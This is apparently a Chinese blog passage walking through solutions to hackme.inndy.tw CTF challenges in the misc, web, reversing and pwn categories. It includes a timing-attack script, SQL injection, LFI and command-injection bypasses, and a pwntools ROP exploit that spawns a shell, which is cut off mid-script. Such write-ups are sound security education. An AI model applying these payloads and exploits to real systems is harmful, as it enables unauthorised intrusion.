class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python2</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">rot13</span><span class="params">(s)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> s.translate(string.maketrans(string.uppercase + string.lowercase,</span><br><span class="line">        string.uppercase[<span class="number">13</span>:] + string.uppercase[:<span class="number">13</span>] +</span><br><span class="line">        string.lowercase[<span class="number">13</span>:] + string.lowercase[:<span class="number">13</span>]))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">base64</span><span class="params">(s)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">''</span>.join(s.encode(<span class="string">'base64'</span>).split())</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">hex</span><span class="params">(s)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> s.encode(<span class="string">'hex'</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">upsidedown</span><span class="params">(s)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> s.translate(string.maketrans(string.uppercase + string.lowercase,</span><br><span class="line">        string.lowercase + string.uppercase))</span><br><span class="line"></span><br><span class="line">flag = <span class="string">'FLAG&#123;.....................&#125;'</span>  <span class="comment"># try to recover flag</span></span><br><span class="line"></span><br><span class="line">E = (rot13, base64, hex, upsidedown)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(random.randint(<span class="number">30</span>, <span class="number">50</span>)):</span><br><span class="line">    <span class="keyword">print</span> i</span><br><span class="line">    c = random.randint(<span class="number">0</span>, len(E) - <span class="number">1</span>)</span><br><span class="line">    flag = <span class="string">'%d%s'</span> % (c, E[c](flag))</span><br><span class="line"></span><br><span class="line">open(<span class="string">'flag.enc'</span>, <span class="string">'w'</span>).write(flag)</span><br></pre></td></tr></table></figure><p>不过虽然看上去挺难, 但仔细点就会发现 c 的值就在密文开头</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> binascii <span class="keyword">import</span> unhexlify</span><br><span class="line"><span class="keyword">from</span> base64 <span class="keyword">import</span> b64decode</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">unrot13</span><span class="params">(s)</span>:</span></span><br><span class="line">     <span class="keyword">return</span> s.translate(str.maketrans(string.ascii_uppercase[<span class="number">13</span>:] + string.ascii_uppercase[:<span class="number">13</span>] +</span><br><span class="line">                                         string.ascii_lowercase[<span class="number">13</span>:] + string.ascii_lowercase[:<span class="number">13</span>],</span><br><span class="line">                                         string.ascii_uppercase + string.ascii_lowercase))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">unupsidedown</span><span class="params">(s)</span>:</span></span><br><span class="line">     <span class="keyword">return</span> s.translate(str.maketrans(string.ascii_lowercase + string.ascii_uppercase,</span><br><span class="line">                                         string.ascii_uppercase + string.ascii_lowercase))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">unbase64</span><span class="params">(s)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> b64decode(s).decode()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">unhex</span><span class="params">(s)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> unhexlify(s).decode()</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> open(<span class="string">'./flag.enc'</span>) <span class="keyword">as</span> f:</span><br><span class="line">    data = f.read()</span><br><span class="line"></span><br><span class="line">E = (unrot13, unbase64, unhex, unupsidedown)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">50</span>):</span><br><span class="line">    c, data = int(data[<span class="number">0</span>]), data[<span class="number">1</span>:]</span><br><span class="line">    data = E[c](data)</span><br><span class="line">    <span class="keyword">if</span> data.startswith(<span class="string">'FLAG'</span>):</span><br><span class="line">        print(data)</span><br><span class="line">        <span class="keyword">break</span></span><br></pre></td></tr></table></figure><h2 id="slow"><a href="#slow" class="headerlink" title="slow"></a>slow</h2><blockquote><p>nc hackme.inndy.tw 7708</p><p>OMG, It&#39;s slow.</p></blockquote><p>这道题本来一直都没有头绪, 后来打完 TJCTF 后再看, 才反应过来是时序攻击.<br>因为打 TJCTF 的时候也遇到了一道类似的, 体验十分艹蛋..., 道理我都懂, 可我网络不好啊(摔).<br>当时找到了一个轮子 <a href="https://github.com/SakiiR/timeauth" target="_blank" rel="noopener">timeauth</a>, 颜值挺高, 不过没有多线程太弱了orz</p><p>尤其是对于这道题, 验证一次要数秒, 每多一位验证时间也 <del>+1s</del>, 没有多线程那得跑多久......<br>于是毫不犹豫 fork 了一份拿来魔改: <a href="https://github.com/Aloxaf/timeauth" target="_blank" rel="noopener">timeauth</a> </p><p>charset 37位, 开个19线程. 跑了二十多分钟就出 flag 了.</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> string <span class="keyword">import</span> ascii_uppercase, digits</span><br><span class="line"><span class="keyword">from</span> time <span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> remote, context</span><br><span class="line"><span class="keyword">from</span> timeauth <span class="keyword">import</span> TimeAuthChecker</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ExampleChecker</span><span class="params">(TimeAuthChecker)</span>:</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self)</span>:</span></span><br><span class="line">        super(self.__class__, self).__init__(</span><br><span class="line">            charset=ascii_uppercase + digits + <span class="string">'_'</span>,</span><br><span class="line">            token_length=<span class="number">30</span>, <span class="comment"># 随便猜的长度</span></span><br><span class="line">            max_thread=<span class="number">19</span></span><br><span class="line">        )</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">request</span><span class="params">(self, token)</span>:</span></span><br><span class="line">        context.log_level = <span class="string">'error'</span></span><br><span class="line">        s = remote(<span class="string">'hackme.inndy.tw'</span>, <span class="number">7708</span>)</span><br><span class="line">        base_time = time()</span><br><span class="line">        s.sendlineafter(<span class="string">'What is your flag?'</span>, <span class="string">'FLAG&#123;'</span> + token + <span class="string">'&#125;'</span>)</span><br><span class="line">        s.readall()</span><br><span class="line">        s.close()</span><br><span class="line">        <span class="keyword">return</span> time() - base_time</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    a = ExampleChecker()</span><br><span class="line">    a.process()</span><br><span class="line">    a.print_token()</span><br></pre></td></tr></table></figure><p><del>(考虑到本咸鱼不知道向后兼容为何物, 这份代码说不定现在已经跑不了了)</del></p><h2 id="pusheen-txt"><a href="#pusheen-txt" class="headerlink" title="pusheen.txt"></a>pusheen.txt</h2><blockquote><p>Do you think pusheen is cute?</p></blockquote><p>下载解压得到 pusheen.txt, 里面是一堆不可名状的字符画</p><p>总共就两种, 把这个序列转成二进制, 再转ASCII, 就得到了 flag</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">grep -oP <span class="string">"(▄▀▀▒██▒██▒)|(▄▀▀ ██ ██ )"</span> pusheen.txt|xargs <span class="built_in">echo</span> -n|sed <span class="string">'s/▄▀▀▒██▒██▒/1/g;s/▄▀▀ ██ ██/0/g;s/ //g'</span>|rax2 -bt</span><br></pre></td></tr></table></figure><h2 id="big"><a href="#big" class="headerlink" title="big"></a>big</h2><blockquote><p>It&#39;s a big file, read the flag.</p></blockquote><p>下载一个 big.xxz, 解压一次得到 big.xz. 里面是个 16G 的 <code>big</code> 文件</p><p>xzcat 看一下前面, 发现都是 <code>THISisNOTFLAG{}</code>, 估计在最末尾......</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> lzma</span><br><span class="line"></span><br><span class="line">f = lzma.open(<span class="string">'./big.xz'</span>)</span><br><span class="line">f.seek(<span class="number">-100</span>, <span class="number">2</span>) <span class="comment">#巨慢的 seek()...</span></span><br><span class="line">print(f.read())</span><br></pre></td></tr></table></figure><p>(听 M4x 师傅说这道题 Inndy 师傅本意是让我们直接修改 xz 文件去掉开头的一堆重复...)</p><p><del>后来我试着研究了一下, 放弃了</del></p><h1 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h1><h2 id="hide-and-seek"><a href="#hide-and-seek" class="headerlink" title="hide and seek"></a>hide and seek</h2><blockquote><p>Can you see me? I&#39;m so close to you but you can&#39;t see me.</p></blockquote><p>在首页</p><h2 id="guestbook"><a href="#guestbook" class="headerlink" title="guestbook"></a>guestbook</h2><blockquote><p>This guestbook sucks. sqlmap is your friend.</p></blockquote><p>打开网站, 有三个选项, Home, Message List, 和 New Post. 点击 New Post<br>随便发个帖, 然后回到 Message List, 点击即可进入开始发的帖子.</p><p>获得帖子的 url 如下: <code>https://hackme.inndy.tw/gb/?mod=read&amp;id=9</code></p><p>试着访问 id=8, 访问不了. 直接 <code>sqlmap -u &#39;https://hackme.inndy.tw/gb/?mod=read&amp;id=9&#39;</code> 失败, 显示被重定向. 看了需要传递更多的信息给 sqlmap (cookie, user-agent 啥的)</p><p>首先利用 BurpSuite 抓包, 然后对截获的数据包执行 Action: Copy to file.<br>假设保存为了 <code>request.txt</code>. 然后执行 <code>sqlmap -q request.txt -p id</code>,<br>成功判断出注入类型为基于时间的盲注, 然后按套路找 flag 就行.</p><h2 id="LFI"><a href="#LFI" class="headerlink" title="LFI"></a>LFI</h2><blockquote><p>What this admin&#39;s password? That is not important at all, just get the flag.<br>Tips: LFI, php://filter</p></blockquote><p>本地文件包含漏洞. 使用<br><code>php://filter/read=convert.base64-encode/resource=pages/login</code> 读取 login.php 的源码, 得到了管理员用户名和密码的 MD5, 根据 MD5 查到 password, 登录得到flag</p><h2 id="homepage"><a href="#homepage" class="headerlink" title="homepage"></a>homepage</h2><blockquote><p>Where is the flag? Did you check the code?</p></blockquote><p>根据提示去找code, 能发现一个 aaencode 过的js, 解密以后得到如下代码</p><p>(值得一提的是 chrome 似乎自带了反混淆功能? 执行混淆后的代码, 在输出中点击 VM374:3 这种, 就会得到非常清晰的代码)</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">print_qrcode</span>(<span class="params">o, c, n, e</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">var</span> r = [],</span><br><span class="line">    l = [];</span><br><span class="line">  c = c || <span class="string">"22px"</span>, n = n || <span class="string">"black"</span>, e = e || <span class="string">"white"</span>;</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; o.length; i++) &#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">var</span> p = o[i], t = <span class="number">0</span>; t &lt; p.length; t++) l.push(<span class="string">"%c\u25a0"</span>), r.push(<span class="string">"line-height:0; font-size: "</span> + c + <span class="string">"; color:"</span> + (<span class="string">"1"</span> == p[t] ? n : e));</span><br><span class="line">    l.push(<span class="string">"\n"</span>)</span><br><span class="line">  &#125;</span><br><span class="line">  r.unshift(l.join(<span class="string">""</span>)), <span class="built_in">console</span>.log.apply(<span class="built_in">console</span>, r)</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">var</span> qrcode = [<span class="string">"11111110001000110011101111111"</span>, <span class="string">"10000010111000110100101000001"</span>, <span class="string">"10111010100000100100001011101"</span>, <span class="string">"10111010010010010001001011101"</span>, <span class="string">"10111010111010111010101011101"</span>, <span class="string">"10000010101010011001001000001"</span>, <span class="string">"11111110101010101010101111111"</span>, <span class="string">"000000001011000101101"</span>, <span class="string">"1101001100011110101000111011"</span>, <span class="string">"1111000111011010110011110001"</span>, <span class="string">"1101111000011100101100011001"</span>, <span class="string">"110111011111110110110101001"</span>, <span class="string">"01011011001100101111111101001"</span>, <span class="string">"00100101010101000101110000111"</span>, <span class="string">"00011011000101100110011001111"</span>, <span class="string">"1010110101010001111101101001"</span>, <span class="string">"00001011110011000111110001111"</span>, <span class="string">"0101100100001110100011110001"</span>, <span class="string">"10010111100110100010110111011"</span>, <span class="string">"0010110110101011011010011101"</span>, <span class="string">"10010110010000001010111110111"</span>, <span class="string">"0000000011110010110110001111"</span>, <span class="string">"1111111010100000101010101111"</span>, <span class="string">"10000010000000111000100011101"</span>, <span class="string">"10111010001010001000111110011"</span>, <span class="string">"1011101010111000001010100111"</span>, <span class="string">"10111010001010000111110010001"</span>, <span class="string">"1000001011101111111110010101"</span>, <span class="string">"1111111011010110010011001101"</span>];</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">"%cI love CTF!"</span>, <span class="string">"color: pink; font-size: 64px"</span>), print_qrcode(qrcode, <span class="string">"25px"</span>, <span class="string">"#333"</span>, <span class="string">"#ccc"</span>);</span><br></pre></td></tr></table></figure><p>可以看到里面有 qrcode 字样, 将这串01数组转成图片就能得到二维码(有个比较短的需要自己补齐),<br>扫描得到flag</p><h2 id="ping"><a href="#ping" class="headerlink" title="ping"></a>ping</h2><blockquote><p>Can you ping 127.0.0.1?</p></blockquote><p>题目给了源码, 目的是对这个命令注入 <code>ping -c 1 &quot;{$ip}&quot; 2&gt;&amp;1</code></p><p>过滤了 &amp;, |, ; 等字符, 但可以用 \$(ls) 这种来替换掉原来的ip, 可以在报错中得到部分信息.</p><p>虽然过滤了 cat, 但 linux 下能读取文件的命令还很多, 至于字符串 flag 被过滤就用通配符来代替即可</p><h2 id="scoreboard"><a href="#scoreboard" class="headerlink" title="scoreboard"></a>scoreboard</h2><blockquote><p>DO NOT ATTACK or SCAN scoreboard, you don&#39;t need to do that.</p></blockquote><p>嗯....藏在post的HEADER里</p><h2 id="login-as-admin-0"><a href="#login-as-admin-0" class="headerlink" title="login as admin 0"></a>login as admin 0</h2><blockquote><p>SQL Injection!</p></blockquote><p>可以看到源码, SQL语句模板如下<br><code>&quot;SELECT * FROM `user` WHERE `user` = &#39;%s&#39; AND `password` = &#39;%s&#39;&quot;</code>.<br>并且网页会在源码中返回 debug 信息, 包含了完整的 SQL 语句.</p><p>代码主要过滤了 <code>&#39;</code> , 将其替换为了 <code>\&#39;</code> , 可以用 <code>\&#39;</code> 绕过. (替换后变成了 <code>\\&#39;</code>, 我们添加的转义符转义了它添加的转义符233 )</p><h2 id="login-as-admin-3"><a href="#login-as-admin-3" class="headerlink" title="login as admin 3"></a>login as admin 3</h2><p>又是神奇的比较,  <code>&quot;asd&quot; == 0</code> , 妙啊妙啊. 使 <code>sig=0</code> 就能保证验证通过(对于这道题)</p><h2 id="login-as-admin-4"><a href="#login-as-admin-4" class="headerlink" title="login as admin 4"></a>login as admin 4</h2><p>本意应该是检测到密码不对就跳转到 fail 页面, 然而添加完 header 以后并没有及时退出, 只要找个命令行工具就可以忽略掉跳转看到后面的 flag 了</p><h2 id="login-as-admin-6"><a href="#login-as-admin-6" class="headerlink" title="login as admin 6"></a>login as admin 6</h2><p><code>extract</code>函数可以从一个数组中导入变量到当前的符号表中, 那直接简单粗暴地发送 <code>{&quot;user&quot;: &quot;admin&quot;}</code> 就好了...</p><h2 id="login-as-admin-7"><a href="#login-as-admin-7" class="headerlink" title="login as admin 7"></a>login as admin 7</h2><p>验证密码的方式是</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">md5($_POST[<span class="string">'password'</span>]) == <span class="string">'00000000000000000000000000000000'</span></span><br></pre></td></tr></table></figure><p>php 的神奇类型转换, <code>&#39;0e123456&#39; == &#39;0&#39;</code>, 只要找一个以 0e 开头并且后面全是纯数字的 md5 就行了.</p><p>搜一下能搜到很多.</p><h2 id="dafuq-manager-1"><a href="#dafuq-manager-1" class="headerlink" title="dafuq-manager 1"></a>dafuq-manager 1</h2><blockquote><p>Login as guest and find flag 1</p></blockquote><p>篡改cookie的题, 进去后有提示</p><h1 id="Reversing"><a href="#Reversing" class="headerlink" title="Reversing"></a>Reversing</h1><h2 id="helloworld"><a href="#helloworld" class="headerlink" title="helloworld"></a>helloworld</h2><blockquote><p>Guess a number please :D</p></blockquote><p>猜数字, 没啥混淆, 直接IDA</p><h2 id="simple"><a href="#simple" class="headerlink" title="simple"></a>simple</h2><blockquote><p>A little bit harder</p></blockquote><p>确实很simple</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"></span><br><span class="line">s = <span class="string">b'UIJT.JT.ZPVS.GMBH'</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> s:</span><br><span class="line">    print(chr(i - <span class="number">1</span>), end=<span class="string">''</span>)</span><br></pre></td></tr></table></figure><h2 id="pyyy"><a href="#pyyy" class="headerlink" title="pyyy"></a>pyyy</h2><blockquote><p>Can you pass the challenage?</p></blockquote><p>uncompyle6 反编译一下就行. 传说中的Y-组合子, 可以实现匿名函数的递归.<br>举个例子, 下面代码中的 self 就代表那个匿名函数自身.</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">(<span class="keyword">lambda</span> _, arg1, arg2: _(_, arg1, arg2))(</span><br><span class="line">    <span class="keyword">lambda</span> self, arg1, arg2: <span class="string">'I can call my self'</span>, arg1, arg2)</span><br></pre></td></tr></table></figure><p>不过不知道也无所谓, 反正得到 flag 只要 <code>int(c) == l</code> 成立. c 是用户输入, l 是程序计算得到的值, 而且与 c 无关.</p><p>那直接加个 print 输出 l 就行.</p><h2 id="accumulator"><a href="#accumulator" class="headerlink" title="accumulator"></a>accumulator</h2><blockquote><p>Reverse this for the flag</p></blockquote><p>程序接受一个 flag, SHA512 后送入某函数(姑且称之为 check )检查.</p><p>分析check函数可得知验证方法就是把每一位累加, 然后与一个全局数组进行比对.</p><p>提取出全局数组, 然后两两作差即可得到flag</p><h2 id="GCCC"><a href="#GCCC" class="headerlink" title="GCCC"></a>GCCC</h2><blockquote><p>Maybe you should try some z3 magic.</p></blockquote><p>一个 .Net 程序, 反编译以后可以发现只要求得一个 uint32 变量的值就能得到flag了.</p><p>验证过程并不耗时, 于是直接爆破, 秒出 flag . (不过我的爆破顺序是从2^32^ -> 1)</p><h2 id="ccc"><a href="#ccc" class="headerlink" title="ccc"></a>ccc</h2><blockquote><p>ccc cc</p></blockquote><p>程序接受一个flag, 分别计算前 3, 6, 9, ... 位的crc32值然后与 hashes 数组中的值进行比较.</p><p>每次的爆破量只有三位, 直接爆破就行</p><h2 id="bitx"><a href="#bitx" class="headerlink" title="bitx"></a>bitx</h2><blockquote><p>bits?</p></blockquote><p>这道题可以不逆向直接一位一位爆破...不知道是故意的还是题目漏洞...</p><h2 id="2018-rev"><a href="#2018-rev" class="headerlink" title="2018-rev"></a>2018-rev</h2><blockquote><p>Happy New Year 2018! Can you execute this binary on the right time with the right argv?</p></blockquote><p>运行/反编译可以得知, 这个程序需要在 <code>argc == 2018 &amp;&amp; argv[0][0] == 1 &amp;&amp; envp[0][0] == 1</code> 和时间为<br><code>2018-01-01 00:00:00 (UTC)</code> 的情况下才会输出flag.</p><p>argc 直接 <code>./2018.rev {1..2017}</code> 就能满足, argv[0][0] 的话可以建立一个名为 <code>\x01</code> 的文件夹 (ls 看起来是这个样子<br><code>$&#39;\001&#39;</code>, nautilus 里看到是个空白...) 然后 <code>$&#39;\001&#39;/2018.rev {1..2017}</code></p><p>envp 那个试了一下不好解决, 主要是没办法让自己的变量刚好在第一位.<br>于是我就用IDA patch掉了这里 (当然后面引用了这个地方的也要一并patch掉)</p><p>时间这个一开始用 libfaketime, 一直通不过验证. 一怒之下直接也 patch 掉了这里, 然后发现这个时候其实已经可以看出flag了...</p><p>也可以直接改时间: <code>sudo date -su &#39;2018-01-01 00:00:00&#39;;$&#39;\001&#39;/2018.rev {1..2017}</code>得到完整的flag.</p><p>(其实一开始想到了这个, 可是觉得改回来会很麻烦就一直没去做, 最后试了才发现这个时间系统秒改回...完全不用担心把时间弄乱</p><h2 id="what-the-hell"><a href="#what-the-hell" class="headerlink" title="what-the-hell"></a>what-the-hell</h2><blockquote><p>Tips: modinv, Something is slow there in my code, make it faster.</p></blockquote><p>这道题真是把我坑到了.</p><p>首先IDA走起, 程序接受两个 uint 数字赋给两个 int 变量. 然后调用<br><code>calc_key3</code> 验证并计算下一步的key.</p><p>前面四个条件用 z3 + gmpy2 轻松算出了一组结果. 接下来就是what函数,<br>真的是相当慢.</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">a1, a2 = BitVecs(<span class="string">'a1, a2'</span>, <span class="number">32</span>)</span><br><span class="line">solver = Solver()</span><br><span class="line">solver.add(a1 * a2 == <span class="number">-574406350</span>)</span><br><span class="line">solver.add((a1 ^ <span class="number">0x7E</span>) * (a2 + <span class="number">16</span>) == <span class="number">1931514558</span>)</span><br><span class="line">solver.add((SignExt(<span class="number">16</span>, a1) - SignExt(<span class="number">16</span>, a2)) &amp; <span class="number">0xFFF</span> == <span class="number">3295</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> solver.check() == sat:</span><br><span class="line">    m = solver.model()</span><br><span class="line">    x = m[a1].as_long()</span><br><span class="line">    y = m[a2].as_long()</span><br><span class="line">    <span class="keyword">if</span> is_prime(x):</span><br><span class="line">        print(x, y)</span><br><span class="line">    solver.add(Or(a1 != x, a2 != y))</span><br></pre></td></tr></table></figure><p>不难看出 what is fibonacci, 第一反应是使用 gmpy2.fib 进行计算. 算了半天发现不对劲, 才想起这个地方会溢出.</p><p>于是使用 numpy.int32 手动运算, 辅以 <code>lru_cache</code>, 然而 maxsize 太小速度过慢,<br>太大轻松爆内存, 再加上 Python 递归层数限制....最后选择用 C .</p><p>C语言的实现非常高效, 然而并没有跑出我需要的key.<br>反复检查以后无奈跑到了M4x大佬的博客, 看了大佬的wp才发现这个地方a1和a2有两组解....</p><p>修改程序跑出另一组解, 顺利拿到 key, 然后直接用IDA patch掉多余的部分, 直接令 key = xxxx.</p><p>运行, 输入 key1 key2, 成功得到 flag</p><h2 id="mov"><a href="#mov" class="headerlink" title="mov"></a>mov</h2><blockquote><p>MOV instruction is turing complete!</p></blockquote><p>有了 bitx 那道题的经验, 这道题又直接逐位爆破搞了出来...<br>(<del>爆破真是太棒了</del>)</p><h1 id="Pwn"><a href="#Pwn" class="headerlink" title="Pwn"></a>Pwn</h1><h2 id="catflag"><a href="#catflag" class="headerlink" title="catflag"></a>catflag</h2><blockquote><p>nc hackme.inndy.tw 7709<br>Try using nc connect to server!</p></blockquote><p>签到题, nc 上去 <code>cat flag</code></p><h2 id="homework"><a href="#homework" class="headerlink" title="homework"></a>homework</h2><blockquote><p>nc hackme.inndy.tw 7701<br>Source Code, Index out bound, Return Address</p></blockquote><p>给了二进制和源码, 题目其实很简单, 数组下标越界导致了任意位置读写,<br>就算开了 canary 也没用.</p><p>直接把 ret 所在位置覆盖为 <code>call_memaybe</code> 函数地址就行了.</p><p>(然而太久没做 pwn 的我竟然把偏移算错了....)</p><h2 id="ROP"><a href="#ROP" class="headerlink" title="ROP"></a>ROP</h2><blockquote><p>nc hackme.inndy.tw 7704<br>Tips: Buffer Overflow, ROP<br>ROP輕鬆談 by L4ys</p></blockquote><p>首先 checksec 一下, 没有 canary. 一个采用静态链接的巨大程序.</p><p>到题目给出的链接看了一下, 应该是使用 ROPgadget. 试了一下,<br>一行代码就找出了 ROP chain, 妙啊. 然后计算好偏移把 ROP chain 写进去就行了.</p><h2 id="ROP2"><a href="#ROP2" class="headerlink" title="ROP2"></a>ROP2</h2><blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt; nc hackme.inndy.tw 7703</span><br><span class="line">&gt;</span><br></pre></td></tr></table></figure></blockquote><blockquote><p><code>ROPgadget</code>  not working anymore</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">[*] &apos;/tmp/tmp/rop2&apos;</span><br><span class="line">    Arch:     i386-32-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x8048000)</span><br></pre></td></tr></table></figure><p>开了栈不可执行. 不过可以调用 SYS_read, 往 some_buffer (.bss段的某个全局变量) 写入 /bin/sh, 然后调用 SYS_exexce get shell</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> pwnlib.constants <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">pwnlib.gdb.context.terminal = [<span class="string">'konsole'</span>, <span class="string">'-e'</span>]</span><br><span class="line">context(log_level=<span class="string">'DEBUG'</span>, arch=<span class="string">'i386'</span>)</span><br><span class="line"></span><br><span class="line">io = remote(<span class="string">'hackme.inndy.tw'</span>, <span class="number">7703</span>)</span><br><span class="line"><span class="comment"># io = process('./rop2')</span></span><br><span class="line">ex = ELF(<span class="string">'./rop2'</span>)</span><br><span class="line"><span class="comment"># pwnlib.gdb.attach(io)</span></span><br><span class="line"><span class="comment"># raw_input()</span></span><br><span class="line"></span><br><span class="line">buf_addr = ex.symbols[<span class="string">'some_buffer'</span>]</span><br><span class="line">syscall_addr = ex.plt[<span class="string">'syscall'</span>]</span><br><span class="line">overflow_addr = ex.symbols[<span class="string">'overflow'</span>]</span><br><span class="line"></span><br><span class="line">payload = flat([<span class="string">'\x90'</span> * (<span class="number">0xC</span> + <span class="number">0x4</span>), syscall_addr, overflow_addr,</span><br><span class="line">                SYS_read, constants.STDIN_FILENO, buf_addr, <span class="number">7</span>])</span><br><span class="line">io.sendafter(<span class="string">':'</span>, payload)</span><br><span class="line">io.send(<span class="string">'/bin/sh'</span>)</span><br><span class="line"></span><br><span class="line">payload = flat([<span class="string">'\x90'</span> * (<span 